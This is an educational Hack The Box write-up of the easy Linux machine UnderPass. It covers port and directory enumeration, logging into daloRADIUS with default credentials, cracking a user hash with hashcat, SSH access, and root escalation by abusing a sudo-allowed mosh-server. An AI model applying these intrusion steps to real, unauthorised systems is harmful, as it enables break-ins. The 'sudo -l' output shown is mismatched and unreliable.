---
title: "HTB Writeup: UnderPass (Easy - Linux)"
date: 2025-03-01
tags: ["HackTheBox", "Linux", "Easy", "daloRADIUS", "DefaultCredentials", "Hashcat", "mosh-server", "Privesc"]
categories: ["HTB Writeups"]
description: "daloRADIUS default creds → SSH → privesc via mosh-server"
showToc: true
---

## 📈 Introduction

![UnderPass Logo](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/UnderPass.png)

In this write-up, I'll walk you through my approach to solving the UnderPass machine from Hack The Box. UnderPass is a Linux machine rated as "Easy," but it teaches several great lessons about service enumeration, web application analysis, and a very cool local privilege escalation vector.

I'll document what I did, what I learned, and how I eventually captured both the `user.txt` and `root.txt` flags.

---

## 🔎 Enumeration

### 🔗 Nmap Scan

The first step was to scan the target IP to identify open ports and services. I ran a full TCP port scan:

```bash
nmap -sS -p- -sV -Pn 10.10.11.48
```

```text
22/tcp → OpenSSH 8.9p1
80/tcp → Apache httpd 2.4.52
```

At this point, no other TCP ports were visible to me (note: some users reported seeing additional UDP ports with `-sU`, but my scan did not reveal them).

---

## 🌐 Web Enumeration

Visiting `http://underpass.htb`, I found an Apache default page.

A deeper gobuster scan revealed the path:

```text
/daloradius/
```

I did a quick Google search on "daloRadius". daloRADIUS is a web management platform for FreeRADIUS servers.

Navigating to: `http://underpass.htb/daloradius/app/operators/login.php`

---

## 🔑 Accessing daloRADIUS

A little research and testing of default credentials revealed that `administrator:[REDACTED]` worked!

![daloRADIUS login](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/1underpassscreenshot.png)

After logging in to the daloRADIUS panel, I clicked on the green Users box. Inside the Users list, I found a single user: `svcMosh`. Next to it was a hashed password:

![Found Hash](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/2underpassscreenshot.png)

I exported this hash and cracked it offline using hashcat, which revealed the password.

With these credentials, I successfully SSH'd into the machine:

```bash
ssh svcMosh@underpass.htb
```

![Logged in as svcMosh](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/3underpassscreenshot.png)

---

## 🚀 Privilege Escalation

After gaining access as svcMosh, I checked for sudo permissions:

```bash
sudo -l
```

```text
svcMosh@underpass:~$ sudo /usr/bin/mosh-server
MOSH CONNECT 60001 3PSOzTOTbHfiPjxmVRxQog
[mosh-server detached, pid = 1988]
```

**What is mosh-server?**
mosh-server is part of the Mosh (mobile shell) package. It establishes an encrypted session between a client and server. When run as root, it spawns a privileged session and outputs a `MOSH CONNECT` line.

### 💥 Exploit Path

```bash
svcMosh@underpass:~$ sudo /usr/bin/mosh-server
MOSH CONNECT 60001 3PSOzTOTbHfiPjxmVRxQog
[mosh-server detached, pid = 1988]
svcMosh@underpass:~$ MOSH_KEY=[REDACTED] mosh-client 127.0.0.1 60001
```

This spawned a new shell. Because mosh-server was running as root, I now had a root shell.

![Root shell](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/pwnedunderpass.png)

---

## 📜 Lessons Learned

The box combined:

- Basic service enumeration (SSH, HTTP)
- Classic default credential weakness in daloRADIUS
- Interesting local privesc via sudo mosh-server abuse

A great example of chaining low-hanging fruit into full system compromise!

### ✅ Machine Completed: UnderPass

[9t0wl #1984386](https://app.hackthebox.com/profile/1984386)
